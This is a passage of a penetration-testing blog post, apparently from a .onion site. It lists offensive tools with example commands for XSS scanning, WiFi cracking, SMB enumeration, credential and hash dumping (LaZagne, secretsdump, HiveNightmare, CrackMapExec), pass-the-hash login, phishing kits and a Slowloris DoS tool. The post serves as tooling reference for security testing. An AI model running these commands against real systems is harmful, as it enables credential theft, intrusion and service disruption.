+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">"http://example.com/search.php?q=query"</span></span><br><span class="line">python xsstrike.py -u <span class="string">"http://example.com/page.php"</span> --crawl</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/M4cs/traxss">Traxss</a> - automated XSS Vulnerability Scanner. Installed in <code>/opt</code> from GitHub as Python virtual environment.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 traxss.py</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/hahwul/XSpear">XSpear</a> powerfull XSS Scanning and Parameter analysis tool&amp;gem.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xspear -u <span class="string">"http://example.com/listproducts.php?cat=123"</span> -v 0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/pwn0sec/PwnXSS">PwnXSS</a> vulnerability (XSS) scanner exploit. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pwnxss.py -u http://example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>When searching for open relays.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/azizz98/xSMTP">xSMTP</a> lightning fast, multithreaded smtp scanner targeting open-relay and unsecured servers in multiple network ranges. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 xsmtp.py</span><br><span class="line">&gt; 1</span><br><span class="line">Enter a website url:</span><br><span class="line">&gt; exmaple.com</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="WiFi-cracking"><a href="#WiFi-cracking" class="headerlink" title="WiFi cracking"></a>WiFi cracking</h3><p>Because sometimes you have to hack somewhere to be able to hack.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/D3Ext/WEF">WEF</a> Wi-Fi Exploitation Framework. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> wef -i wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/bettercap/bettercap">Bettercap</a> the Swiss Army knife for 802.11, BLE, IPv4 and IPv6 networks reconnaissance and MITM attacks. It is a GUI tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> bettercap -caplet http-ui</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Default credentials are here <code>/usr/local/share/bettercap/caplets/http-ui.cap</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MS-WEB-BN/h4rpy">H4rpy</a> automated WPA/WPA2 PSK attack tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./h4rpy</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/martin-olivier/airgorah">Airgorah</a> a WiFi security auditing software mainly based on aircrack-ng tools suite. It is a GUI app, just run it from the menu.</p>
+<p>Also check out <a target="_blank" rel="noopener" href="https://github.com/hash3liZer/WiFiBroot">WiFiBroot</a>.</p>
+<h3 id="Compromised-machine"><a href="#Compromised-machine" class="headerlink" title="Compromised machine"></a>Compromised machine</h3><p>When I am inside, I use some of these tools to get more information about the environment and the machine itself. To hack more!</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">Linux smart enumeration</a> in case if I am looking for possibilities in the OS.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"</span> -O lse.sh;<span class="built_in">chmod</span> 700 lse.sh</span><br><span class="line">./lse.sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Other for Linux and Windows is <a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</a> and <a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a>.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> credentials recovery.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laZagne.exe all</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a>
+ performs a number of security oriented host-survey “safety checks” 
+relevant from both offensive and defensive security perspectives.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe -group=all -full</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/lefayjey/linWinPwn">linWinPwn</a> is a bash script that streamlines the use of a number of Active Directory tools.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linWinPwn.sh -t &lt;Domain_Controller_IP&gt; --auto [-o &lt;output_dir&gt;]</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">Impacket</a> is a collection of Python classes for working with network protocols.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="variable">$domain</span>/<span class="variable">$user</span>:<span class="variable">$pass</span>@<span class="variable">$ip</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare">HiveNightmare</a> exploit allowing you to read registry hives as non-admin on Windows 10 and 11.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get SAM, SECURITY and SYSTEM hive dumps</span></span><br><span class="line">.\HiveNightmare.exe</span><br><span class="line"><span class="comment"># Download those 3 files to your machine and dump the hashes:</span></span><br><span class="line">impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY <span class="built_in">local</span></span><br><span class="line"><span class="comment"># Log in to the remote system using the Pass The Hash technique:</span></span><br><span class="line">impacket-psexec -hashes <span class="variable">$hash</span> <span class="variable">$user</span>@<span class="variable">$ip</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.pingcastle.com/">PingCastle</a> is AD configuration and vulnerabilities scanner.</p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>Because the files are everywhere and unsecured.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> is a must if I am on a Windows network.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb IP -u <span class="string">''</span> -p <span class="string">''</span> &amp;&amp; cme smb IP -u<span class="string">'a'</span> -p <span class="string">''</span></span><br><span class="line">crackmapexec smb IP -u <span class="string">'user'</span> -p <span class="string">'pass'</span> --local-auth --sam</span><br><span class="line">crackmapexec smb IP -u user -H <span class="string">'hash'</span> --local-auth -X <span class="string">'whoami'</span></span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -d DOMAIN --lsa</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -d DOMAIN --sam</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -d DOMAIN --sam -M lsassy</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> --ntds</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> --ntds vss</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -M wireless</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -M handlekatz</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -M nanodump</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -M procdump</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> --laps</span><br><span class="line">crackmapexec smb IP -u user -p <span class="string">'pass'</span> -M gpp_password</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a> a tool for pentesters to help find delicious candy. Ehh, interesting files on SMB shares.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">snaffler.exe -s -o snaffler.log</span><br><span class="line">Snaffler.exe -s -i C:\</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Nmap, good old tool at every step.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL list_of_IPs.txt -sV -O -p139,445 -T3 -PN</span><br><span class="line">nmap -iL list_of_445.txt -p139,445 -T3 -PN --script smb-vuln*</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/ShawnDEvans/smbmap">Smbmap</a> is a handy SMB enumeration tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./smbmap.py -u <span class="string">""</span> -p <span class="string">""</span> -P 445 --host-file list_of_targets.txt -g /output_anonymous.txt</span><br><span class="line">./smbmap.py -u <span class="string">"guest"</span> -p <span class="string">""</span> -P 445 --host-file list_of_targets.txt -g /output_guest.txt</span><br><span class="line">./smbmap.py -H 192.168.0.200 -u Administrator -p asdf1234   </span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/punk-security/SMBeagle">SMBeagle</a> fileshare auditing tool. </p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./SMBeagle.exe -c out.csv -f</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerHuntShares">PowerHuntShares</a> is an audit script designed in inventory, analyze, and report excessive privileges configured on Active Directory domains.</p>
+<h3 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h3><p>Sometimes a basic analysis of the mobile app can find APIs or passwords.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dwisiswant0/apkleaks">Apkleaks</a> for scanning APK file for URIs, endpoints &amp; secrets.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apkleaks -f ~/path/to/file.apk</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/n0mi1k/apk2url">Apk2url</a> an OSINT tool to quickly extract IP and URL endpoints from APKs by disassembling and decompiling.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./apk2url.sh /path/to/apk/file.apk</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><p>To find interesting stuff on GitHub.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> - find and verify secrets.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">trufflehog git https://github.com/trufflesecurity/test_keys --only-verified</span><br><span class="line">trufflehog github --org=trufflesecurity --only-verified</span><br><span class="line">trufflehog <span class="comment">#for the wizzard</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/bellingcat/octosuite">Octosuite</a> GitHub Data Analysis Framework.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Legit-Labs/legitify">Legitify</a> detect and remediate misconfigurations and security risks across all your GitHub and GitLab assets.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/punk-security/secret-magpie">Secret Magpie</a> secret Detection Tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py &lt;github/gitlab/azuredevops&gt; --org <span class="string">'github organisation name'</span> --pat <span class="string">'personal access token'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><a target="_blank" rel="noopener" href="https://github.com/brinhosa/apidetector">Apidetector</a>
+ efficiently scan for exposed Swagger endpoints across web domains and 
+subdomains. Supports HTTP/HTTPS, multi-threading, and flexible 
+input/output options. Ideal for API security testing.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python apidetector.py -i list_of_company_subdomains.txt -o results_file.txt -t 30 -ua <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p><a target="_blank" rel="noopener" href="https://github.com/capture0x/Lfi-Space">Lfi-Space</a> to detect Local File Inclusion. Installed in <code>/opt</code> from GitHub as Python virtual environment.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 lfi.py</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h3><p><a target="_blank" rel="noopener" href="https://github.com/HalilDeniz/NetworkAssessment">NetworkAssessment</a> is designed to analyze pcap files to detect potential suspicious network traffic.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HalilDeniz/TrafficWatch">TrafficWatch</a> a packet sniffer tool, allows you to monitor and analyze network traffic from PCAP files.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bee-san/pyWhat">pyWhat</a>
+ identify anything. pyWhat easily lets you identify emails, IP 
+addresses, and more. Feed it a .pcap file or some text and it’ll tell 
+you what it is!</p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><p>Here are some tools that can be used depending on the findings and specific tasks. I have used them at least once in the past.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fO-000/bluing">Bluing</a> an intelligence gathering tool for hacking Bluetooth.</p>
+<p>Some steganography tools that I use more for CTF or labs: <a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk">binwalk</a>, File <a target="_blank" rel="noopener" href="https://github.com/osde8info/stegosuite">stegosuite</a>, <a target="_blank" rel="noopener" href="https://github.com/evyatarmeged/stegextract">stegextract</a>, stegsolver, <a target="_blank" rel="noopener" href="https://github.com/StefanoDeVuono/steghide">steghide</a>,</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/EricksonAtHome/blackeye">Blackeye</a> cool phishing tool with localtunnel.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash blackeye.sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/kgretzky/evilginx2">Evilginx2</a>
+ - standalone man-in-the-middle attack framework used for phishing login
+ credentials along with session cookies, allowing for the bypass of 
+2-factor authentication.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gkbrk/slowloris">Slowloris</a> low bandwidth DoS tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 slowloris.py example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/Orange-Cyberdefense/arsenal">Arsenal</a> is just a quick inventory and launcher for hacking programs, in case you forgot any command :)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/p0dalirius/ApacheTomcatScanner">ApacheTomcatScanner</a> to scan for Apache Tomcat server vulnerabilities.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apachetomcatscanner -tt IP -tp - --list-cves</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/EntySec/RomBuster">RomBuster</a> is a router exploitation tool that allows to disclosure network router admin password.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rombuster -a 192.168.99.1</span><br><span class="line">rombuster --shodan &lt;SHODAN_API&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Additional-materials"><a href="#Additional-materials" class="headerlink" title="Additional materials"></a>Additional materials</h2><p>When
+ my scans and tests find something new or in need of development, or I 
+am unfamiliar with a particular service, software or port, I look to 
+various hacking wikis and cheat sheets for information on what to do 
+next. I’ve always dreamed of creating one of my own, but again, that 
+would take time and commitment, and the ones you’ll find below are 
+perfect. Perhaps in the future, when this article has grown (yes, 
+imagine it can be longer - <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=OcEi2o8g2L0">that’s what she said</a>), I will rework it into its own wiki. (Damn during this article I even started testing <a target="_blank" rel="noopener" href="https://www.mkdocs.org/">MkDocs</a>, <a target="_blank" rel="noopener" href="https://squidfunk.github.io/mkdocs-material/">MkDocs for Material</a>, <a target="_blank" rel="noopener" href="https://teedoc.github.io/get_started/en/usage/sites.html">TeeDoc</a> and <a target="_blank" rel="noopener" href="https://docusaurus.io/">Docusaurus</a>, the last one looks the best after testing, so maybe in the near future… because why not fuck my time).</p>
+<p>Ok but here is a list of sites where I look when I lack knowledge on a particular subject:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ired.team/">https://www.ired.team/</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheet.haax.fr/">https://cheatsheet.haax.fr/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/">https://www.thehacker.recipes/</a></li>
+<li><a target="_blank" rel="noopener" href="https://chryzsh.gitbooks.io/pentestbook/content/">https://chryzsh.gitbooks.io/pentestbook/content/</a></li>
+<li><a target="_blank" rel="noopener" href="https://viperone.gitbook.io/pentest-everything">https://viperone.gitbook.io/pentest-everything</a></li>
+<li><a target="_blank" rel="noopener" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a></li>
+<li><a target="_blank" rel="noopener" href="https://hausec.com/">https://hausec.com/</a></li>
+<li><a target="_blank" rel="noopener" href="https://hideandsec.sh/">https://hideandsec.sh/</a></li>
+<li><a target="_blank" rel="noopener" href="https://redteam.guide/docs/checklists/red-team-checklist">https://redteam.guide/docs/checklists/red-team-checklist</a></li>
+</ul>
+<p>And great mind maps with tools for hacking, in fact, each of these 
+maps can be a separate instruction on which tools to use for a given 
+scenario or service. Fruitfully waste precious life minutes when 
+browsing through such a large repository of knowledge. Because why not 
+fuck your time!</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ignitetechnologies/Mindmap">https://github.com/Ignitetechnologies/Mindmap</a></li>
+</ul>
+<p>One more thing, do not use too many multitools or magic all in one 
+great bounty hunter helper. There are a lot of new projects that 
+automate things between the various tools I listed above. For example <a target="_blank" rel="noopener" href="https://github.com/GhostTroops/scan4all">scan4all</a>, or <a target="_blank" rel="noopener" href="https://github.com/pablosnt/rekono">rekono</a>
+ and many more. These projects are cool until they are developed and 
+maintained, but in the end they are short-lived and have a lot of bugs. 
+There is no one tool that will do everything for you and give you a 
+report that you can send out and get a bounty on. So when you see a tool
+ that has Nikto, Sublister, SQLMap, Gobuster and more in its 
+dependencies, it just means that it is an overlay that runs these tools 
+in the background, collects results from them and possibly passes 
+between modules. Nothing that can really help you. If you want to 
+automate something yourself, write a simple script that does one thing, 
+then passes it on, and you still have to analyse the result at the end. 
+Automation is great, but too much automation leads to errors and you may
+ miss something. It’s a shame to waste a whole day on a scan that turns 
+out to be wrong or miss something. The only thing these tools are useful
+ for a newbie is to understand the steps and the tools used, you can 
+follow their logic and recreate steps for yourself to understand the 
+basics. On the above list you could find some kind of automation tools, 
+but I choose only those that are related to single task, a narrow range 
+of activities in one category.</p>
+<p>See also <a target="_blank" rel="noopener" href="https://github.com/GreyDGL/PentestGPT">PentestGPT</a>. AI is trendy now. YOU MUST USE IT or you are not cool. Not cool.</p>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post" style="display: none;">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/">Home</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/archives/">Post</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/projects/">Projects</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/search/">Search</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/categories/">Cats</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tags/">Tags</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/badges/">Ⓑ</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/donations/">$</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tos/">§</a></li>
+        
+          <li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/atom.xml">Rss</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment"><span class="toc-number">1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Footprinting"><span class="toc-number">2.</span> <span class="toc-text">Footprinting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WHOIS"><span class="toc-number">2.1.</span> <span class="toc-text">WHOIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">2.2.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Traceroute"><span class="toc-number">2.3.</span> <span class="toc-text">Traceroute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-Dorks"><span class="toc-number">2.4.</span> <span class="toc-text">Google Dorks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Internet-of-everything"><span class="toc-number">2.5.</span> <span class="toc-text">Internet of everything</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-AIO"><span class="toc-number">2.6.</span> <span class="toc-text">Recon AIO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF-check"><span class="toc-number">2.7.</span> <span class="toc-text">WAF check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Namp"><span class="toc-number">2.8.</span> <span class="toc-text">Namp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSINT"><span class="toc-number">2.9.</span> <span class="toc-text">OSINT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning-and-enumeration"><span class="toc-number">3.</span> <span class="toc-text">Scanning and enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZAP"><span class="toc-number">3.1.</span> <span class="toc-text">ZAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-number">3.2.</span> <span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#General-vulnerability-scanners"><span class="toc-number">3.3.</span> <span class="toc-text">General vulnerability scanners</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Skipfish"><span class="toc-number">3.4.</span> <span class="toc-text">Skipfish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-scanners-and-tests"><span class="toc-number">3.5.</span> <span class="toc-text">Other scanners and tests</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS-Scanners"><span class="toc-number">3.6.</span> <span 